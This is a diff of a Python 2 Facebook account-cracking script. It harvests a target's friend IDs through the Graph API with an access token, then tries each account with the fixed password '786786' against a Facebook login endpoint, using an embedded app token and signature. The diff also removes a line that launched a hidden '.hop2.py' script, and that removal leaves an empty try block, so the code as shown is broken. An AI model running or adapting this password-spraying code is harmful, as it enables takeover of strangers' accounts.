@@ -10,6 +10,7 @@ sys.setdefaultencoding('utf8')
 br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('user-agent','Mozilla/5.0 (Android 10; Mobile; rv:68.0) Gecko/68.0 Firefox/68.6.0')]
 br.addheaders = [('user-agent','Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36 OPR/59.1.2926.54067')]
 
 def keluar():
@@ -124,8 +125,6 @@ def methodlogin():
 def login():
 	os.system("clear")
 	try:
-		tb=open('login.txt', 'r')
-		os.system("python2 .hop2.py")
 	except (KeyError,IOError):
 		os.system("clear")
 		print (logo)
@@ -232,11 +231,12 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print 42*"\033[1;96m="
-		jalan('\033[1;96m \033[1;93mGetting ID \033[1;97m...')
+		jalan('\033[1;93m[✺] Getting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
+			
 	elif peak =="2":
 		os.system('clear')
 		print logo
@@ -250,7 +250,7 @@ def pilih_super():
 			print"\033[1;96m \x1b[1;91mID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 			super()
-		jalan('\033[1;96m \033[1;93mGetting IDs \033[1;97m...')
+		print"\033[1;35;40m[✺] Getting IDs..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -293,7 +293,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = ('786786')
+			pass1 = '786786'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
